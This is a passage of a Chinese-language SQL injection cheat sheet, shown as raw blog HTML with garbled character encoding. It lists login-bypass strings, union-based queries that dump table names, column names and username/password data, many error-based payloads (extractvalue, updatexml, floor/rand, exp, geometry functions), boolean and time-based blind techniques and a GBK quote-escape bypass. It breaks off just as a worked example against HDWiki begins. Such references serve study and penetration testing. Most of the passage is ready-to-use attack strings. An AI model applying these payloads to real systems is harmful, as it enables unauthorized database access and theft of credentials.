class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> database()<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br>æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼š<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@global</span>.version_compile_os <span class="hljs-keyword">from</span> mysql.user<br>æ•°æ®åº“æƒé™ï¼š<span class="hljs-keyword">and</span> ord(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span> è¿”å›æ­£å¸¸è¯´æ˜ä¸ºroot<br></code></pre></td></tr></table></figure><h3 id="ç»•è¿‡ç™»é™†éªŒè¯"><a href="#ç»•è¿‡ç™»é™†éªŒè¯" class="headerlink" title="ç»•è¿‡ç™»é™†éªŒè¯"></a>ç»•è¿‡ç™»é™†éªŒè¯</h3><ul><li>adminâ€™ â€“</li><li>adminâ€™ #</li><li>adminâ€™&#x2F;*</li><li>â€™ or 1&#x3D;1â€“</li><li>â€™ or 1&#x3D;1#</li><li>â€™ or 1&#x3D;1&#x2F;*</li><li>â€˜) or â€˜1â€™&#x3D;â€™1â€“</li><li>â€˜) or (â€˜1â€™&#x3D;â€™1â€“</li></ul><h3 id="SQLæ³¨å…¥å¸¸è§å‡½æ•°"><a href="#SQLæ³¨å…¥å¸¸è§å‡½æ•°" class="headerlink" title="SQLæ³¨å…¥å¸¸è§å‡½æ•°"></a>SQLæ³¨å…¥å¸¸è§å‡½æ•°</h3><ul><li>group_concatå‡½æ•° å¯ä»¥æŠŠæŸ¥è¯¢çš„å†…å®¹ç»„åˆæˆä¸€ä¸ªå­—ç¬¦ä¸²</li><li>load_file(file name ) è¯»å–æ–‡ä»¶å¹¶å°†æ–‡ä»¶æŒ‰å­—ç¬¦ä¸²è¿”å›</li><li>leftï¼ˆstringï¼Œlengthï¼‰è¿”å›æœ€å·¦è¾¹æŒ‡å®šçš„å­—ç¬¦æ•°ï¼š</li><li>leftï¼ˆdatabaseï¼ˆï¼‰ï¼Œ1ï¼‰&gt;â€˜sâ€™ (çŒœåå­—)</li><li>lengthï¼ˆï¼‰åˆ¤æ–­é•¿åº¦</li><li>lengthï¼ˆdatabaseï¼ˆï¼‰&gt;5</li><li>substrï¼ˆaï¼Œbï¼Œcï¼‰ä»å­—ç¬¦ä¸²aä¸­æˆªå– båˆ°cé•¿åº¦</li><li>asciiï¼ˆï¼‰å°†æŸä¸ªå­—ç¬¦è½¬ä¸ºasciiå€¼</li><li>asciiï¼ˆsubstrï¼ˆuserï¼ˆï¼‰ï¼Œ1ï¼Œ1ï¼‰ï¼‰&#x3D;101#</li><li>midï¼ˆï¼ˆaï¼Œbï¼Œcï¼‰ä»å­—ç¬¦ä¸²aä¸­æˆªå– båˆ°cä½ç½®ï¼ˆå¯ä»¥ç”¨æ¥çŒœæ•°æ®åº“å ï¼‰</li></ul><h3 id="è”åˆçˆ†åº“ï¼š"><a href="#è”åˆçˆ†åº“ï¼š" class="headerlink" title="è”åˆçˆ†åº“ï¼š"></a>è”åˆçˆ†åº“ï¼š</h3><p>è¿™é‡Œå‡è®¾æœ‰3åˆ—ï¼š</p><p>ä¸ºäº†è®©è”åˆæ³¨å…¥å·¥ä½œï¼Œé¦–å…ˆè¦çŸ¥é“æ•°æ®åº“ä¸­çš„è¡¨åï¼Œé”®å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ //--+æ˜¯æŠŠè¯­å¥é—­åˆåæ³¨é‡Šæ‰åé¢çš„è¯­å¥</span><br></code></pre></td></tr></table></figure><p>æœ‰æ—¶ç¨‹åºå¯èƒ½ä¸ä¼šæ‰“å°å‡ºæ‰€æœ‰çš„è¡Œï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¾—ä½¿ç”¨å…³é”®å­—limitä¸€æ¡æ¡è¿›è¡ŒæŸ¥è¯¢ï¼Œé”®å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 --+</span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,table_name,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…å¯ä»¥ç”¨group_concat():</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></code></pre></td></tr></table></figure><p>å‡è®¾æœ‰â€™usersâ€™è¡¨</p><p>ç°åœ¨çœ‹å…¶ä¸­çš„ä¸€ä¸ªè¡¨ï¼Œä¸ºäº†æå–å…¶ä¿¡æ¯ï¼Œé”®å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨â€™columnâ€™æ›¿æ¢äº†â€™tableâ€™ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ˜¯ä¸€ä¸ªè¡¨çš„åˆ—ä¿¡æ¯<br>å‡è®¾æœ‰â€™usernameâ€™ï¼Œâ€™passwordâ€™ï¼Œâ€™flagâ€™åˆ—ï¼Œæˆ‘ä»¬å¯ä»¥é”®å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(username),3 from users --+</span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,flag,3 from users --+</span><br></code></pre></td></tr></table></figure><p>å³å¯æŒ‰éœ€æŸ¥è¯¢æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚</p><h3 id="æŠ¥é”™æ³¨å…¥ï¼š"><a href="#æŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="æŠ¥é”™æ³¨å…¥ï¼š"></a>æŠ¥é”™æ³¨å…¥ï¼š</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span> floor ï¼ˆ<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>()å¯ä¿®æ”¹ï¼‰<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">OR</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">8627</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>),CONCAT(<span class="hljs-number">0x70307e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e7030</span>,<span class="hljs-built_in">FLOOR</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x)a)â€“<span class="hljs-operator">+</span><br>  <br><span class="hljs-operator">-</span> ExtractValue(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿<span class="hljs-number">32</span>ä½) ï¼ˆ<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>å¯ä¿®æ”¹ï¼‰<br>  <br>  <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>))â€“<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> UpdateXml(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿<span class="hljs-number">32</span>ä½) ï¼ˆ<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>å¯ä¿®æ”¹ï¼‰<br><br>  <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)â€“<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> NAME_CONST(é€‚ç”¨äºä½ç‰ˆæœ¬ï¼Œä¸å¤ªå¥½ç”¨)<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> NAME_CONST(version(),<span class="hljs-number">1</span>),NAME_CONST(version(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)â€“<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> Error based <span class="hljs-keyword">Double</span> Query Injection<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat_ws(<span class="hljs-number">0x7e</span>,version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">having</span> <span class="hljs-built_in">min</span>(<span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>â€“<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">5.5</span><span class="hljs-number">.5</span>ä»¥ä¸Š) ï¼ˆ<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()å¯ä¿®æ”¹ï¼‰<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)))â€“<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> <span class="hljs-built_in">floor</span>(Mysql): <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-keyword">user</span>(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <br><span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);<br><br><span class="hljs-operator">-</span> Extractvalue(Mysql): <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));<br><br><span class="hljs-operator">-</span> Updatexml(Mysql): <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br><br><span class="hljs-operator">-</span> EXP: <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));<br><br><span class="hljs-operator">-</span> UTL INADDR. <span class="hljs-keyword">get</span> host address(Oracle): <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>utl inaddrget host address(<span class="hljs-keyword">select</span> bannerO <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>))<br><br><span class="hljs-operator">-</span> multipoint(Mysql)ï¼š<span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> polygon(Mysql)ï¼š<span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> multipolygon(Mysql)ï¼š<span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <br><span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> linestring(Mysql)ï¼š<span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> multilinestring(Mysql)ï¼š<span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h3 id="boolç›²æ³¨"><a href="#boolç›²æ³¨" class="headerlink" title="boolç›²æ³¨"></a>boolç›²æ³¨</h3><ul><li><p>ç›²æ³¨çš„æ—¶å€™ä¸€å®šæ³¨æ„ï¼ŒMySQL4ä¹‹åå¤§å°å†™ä¸æ•æ„Ÿï¼Œå¯ä½¿ç”¨binary()å‡½æ•°ä½¿å¤§å°å†™æ•æ„Ÿã€‚</p></li><li><h5 id="å¸ƒå°”æ¡ä»¶æ„é€ "><a href="#å¸ƒå°”æ¡ä»¶æ„é€ " class="headerlink" title="å¸ƒå°”æ¡ä»¶æ„é€ "></a>å¸ƒå°”æ¡ä»¶æ„é€ </h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>æ­£å¸¸æƒ…å†µ<br> <span class="hljs-string">&#x27;or bool#</span><br><span class="hljs-string"> true&#x27;</span><span class="hljs-keyword">and</span> bool#<br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>ä¸ä½¿ç”¨ç©ºæ ¼ã€æ³¨é‡Š<br> <span class="hljs-string">&#x27;or(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-literal">true</span><span class="hljs-string">&#x27;and(bool)=&#x27;</span><span class="hljs-number">1</span><br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>ä¸ä½¿ç”¨<span class="hljs-keyword">or</span>ã€<span class="hljs-keyword">and</span>ã€æ³¨é‡Š<br> <span class="hljs-string">&#x27;^!(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-string">&#x27;=(bool)=&#x27;</span><br> <span class="hljs-string">&#x27;||(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-literal">true</span><span class="hljs-string">&#x27;%26%26(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-string">&#x27;=if((bool),1,0)=&#x27;</span><span class="hljs-number">0</span><br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>ä¸ä½¿ç”¨ç­‰å·ã€ç©ºæ ¼ã€æ³¨é‡Š<br> <span class="hljs-string">&#x27;or(bool)&lt;&gt;&#x27;</span><span class="hljs-number">0</span><br> <span class="hljs-string">&#x27;or((bool)in(1))or&#x27;</span><span class="hljs-number">0</span><br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>å…¶ä»–<br> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (bool) <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>)<br></code></pre></td></tr></table></figure></li><li><p>æœ‰æ—¶å€™whereå­—å¥æœ‰æ‹¬å·åˆçŒœä¸åˆ°SQLè¯­å¥çš„æ—¶å€™ï¼Œå¯ä»¥æœ‰ä¸‹åˆ—ç±»ä¼¼çš„fuzz</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or (bool) or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27; and (bool) or 1=1 and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><h5 id="æ„é€ é€»è¾‘åˆ¤æ–­"><a href="#æ„é€ é€»è¾‘åˆ¤æ–­" class="headerlink" title="æ„é€ é€»è¾‘åˆ¤æ–­"></a>æ„é€ é€»è¾‘åˆ¤æ–­</h5><ul><li><p>é€»è¾‘åˆ¤æ–­åŸºæœ¬å°±é‚£äº›å‡½æ•°ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>  <br><span class="hljs-function"><span class="hljs-title">right</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>  <br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>  <br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span> <br>    <br><span class="hljs-comment">//ä¸ä½¿ç”¨é€—å· </span><br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span> regexp <span class="hljs-string">&#x27;^[a-z]&#x27;</span><br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span> like <span class="hljs-string">&#x27;root%&#x27;</span><br><span class="hljs-function"><span class="hljs-title">POSITION</span><span class="hljs-params">(<span class="hljs-string">&#x27;root&#x27;</span> in user()</span></span>)<br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span> from <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span><br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span> from <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><h5 id="åˆ©ç”¨order-byç›²æ³¨"><a href="#åˆ©ç”¨order-byç›²æ³¨" class="headerlink" title="åˆ©ç”¨order byç›²æ³¨"></a>åˆ©ç”¨order byç›²æ³¨</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;5&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------+------------------------</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span>    username  <span class="hljs-operator">|</span> password                   <br><span class="hljs-operator">+</span><span class="hljs-comment">----+--------------+------------------------</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> <span class="hljs-number">2</span>            <span class="hljs-operator">|</span> <span class="hljs-number">5</span>                         <br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> admin        <span class="hljs-operator">|</span> <span class="hljs-number">51</span>b7a76d51e70b419f60d34 <br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------- --+------------------------</span><br><span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br>    <br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;6&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-----------+--------------------------</span><br><span class="hljs-operator">|</span>id   <span class="hljs-operator">|</span> username  <span class="hljs-operator">|</span> password                  <br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-----------+--------------------------</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span>  <span class="hljs-operator">|</span> admin     <span class="hljs-operator">|</span><span class="hljs-number">51</span>b7a76d51e70b419f60d3<br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span>  <span class="hljs-operator">|</span>    <span class="hljs-number">2</span>      <span class="hljs-operator">|</span> <span class="hljs-number">6</span>                          <br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-----------+--------------------------</span><br><span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure></li></ul><h3 id="å»¶æ—¶ç›²æ³¨"><a href="#å»¶æ—¶ç›²æ³¨" class="headerlink" title="å»¶æ—¶ç›²æ³¨"></a>å»¶æ—¶ç›²æ³¨</h3><ul><li>ç›¸å¯¹äºboolç›²æ³¨ï¼Œå°±æ˜¯æŠŠè¿”å›å€¼0å’Œ1æ”¹ä¸ºæ˜¯å¦æ‰§è¡Œå»¶æ—¶ï¼Œèƒ½ç”¨å…¶ä»–æ–¹æ³•å°±ä¸ä½¿ç”¨å»¶æ—¶ã€‚</li><li>ä¸€èˆ¬æ ¼å¼if((bool),sleep(3),0)å’Œor (case when (bool) then sleep(3) else 0 end)</li><li>ä¸¤ä¸ªå‡½æ•°ï¼š</li><li>BENCHMARK(100000,MD5(1))</li><li>sleep(5)</li><li>BENCHMARK()ç”¨äºæµ‹è¯•å‡½æ•°çš„æ€§èƒ½ï¼Œå‚æ•°ä¸€ä¸ºæ¬¡æ•°ï¼ŒäºŒä¸ºè¦æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚å¯ä»¥è®©å‡½æ•°æ‰§è¡Œè‹¥å¹²æ¬¡ï¼Œè¿”å›ç»“æœæ¯”å¹³æ—¶è¦é•¿ï¼Œé€šè¿‡æ—¶é—´é•¿çŸ­çš„å˜åŒ–ï¼Œåˆ¤æ–­è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚è¿™æ˜¯ä¸€ç§è¾¹ä¿¡é“æ”»å‡»ï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å ç”¨å¤§é‡çš„cpuèµ„æºï¼Œæ¨èä½¿ç”¨sleep()ã€‚</li></ul><h3 id="Mysqlæ³¨é‡Šç¬¦"><a href="#Mysqlæ³¨é‡Šç¬¦" class="headerlink" title="Mysqlæ³¨é‡Šç¬¦"></a>Mysqlæ³¨é‡Šç¬¦</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span> <span class="hljs-comment">-- -</span><br><span class="hljs-number">2.</span> <span class="hljs-comment">/* .... */</span><br><span class="hljs-number">3.</span> #<br><span class="hljs-number">4.</span> `<br><span class="hljs-number">5.</span> ;<span class="hljs-operator">%</span><span class="hljs-number">00</span> <br></code></pre></td></tr></table></figure><h3 id="GBKç»•è¿‡æ³¨å…¥"><a href="#GBKç»•è¿‡æ³¨å…¥" class="headerlink" title="GBKç»•è¿‡æ³¨å…¥"></a>GBKç»•è¿‡æ³¨å…¥</h3><ul><li>åœ¨åˆ†å·å‰åŠ %df%27</li><li>ç¤ºä¾‹ï¼šid&#x3D;1%df%27 union select 1.2â€“+</li></ul><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><p>ä»¥HDWiki v6.0 UTF8-20170209 